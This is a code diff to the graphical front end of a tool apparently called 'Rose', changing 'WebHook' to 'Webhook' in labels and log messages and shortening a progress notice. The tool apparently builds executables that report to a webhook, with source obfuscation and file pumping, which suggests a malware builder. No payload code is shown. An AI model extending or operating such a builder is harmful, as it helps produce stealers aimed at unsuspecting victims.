@@ -143,9 +143,9 @@ def change_data(key, value):
 async def _test_webhook():
     result = await test_webhook(data_builder["webhook_url"])
     if result == 0:
-        ui.notify("WebHook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
+        ui.notify("Webhook successfuly executed!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
         return 
-    ui.notify("WebHook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
+    ui.notify("Webhook failed to execute!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
 
 async def test_webhook(webhook_url):
     try:
@@ -160,7 +160,7 @@ async def test_webhook(webhook_url):
             await hook.send(embed=embed)
         return 0
     except Exception as e:
-        logger.error(f"WebHook failed to execute - Link: {webhook_url} - Error: {e}")
+        logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
         return 1
 
 def _makebuild(q: Queue, data_builder) -> str:
@@ -426,7 +426,7 @@ def _home():
 
     with ui.column():
         ui.input(
-            label='WebHook URL',
+            label='Webhook URL',
             placeholder='Rose on top baby',  
             on_change=lambda e: change_data("webhook_url", e.value)
         ).props('inline color=pink-3').classes('w-full')
@@ -452,7 +452,7 @@ def _home():
         ui.checkbox('Obfuscate src files', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')  
 
         ui.button(
-            'Test WebHook',
+            'Test Webhook',
             on_click=_test_webhook
         ).props("icon=code color=purple-11").classes('w-full')
         ui.button(
@@ -461,7 +461,7 @@ def _home():
         ).props("icon=build color=pink-3").classes('w-full')
 
         progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
-        might_take = ui.label("At 40% & 70%, compiling/file pumping might take a few minutes depending on your computer & the options you chose. You can look at the progress on both log files.")
+        might_take = ui.label("Some steps in the process may take a few minutes, so please be patient :)")
         ui.button("Open Rose Log", on_click=lambda: os.startfile(Path(__file__).resolve().parent / 'roselog.log'))
         ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(Path(__file__).resolve().parent / 'rosecompile.log'))
         progressbar.visible = False
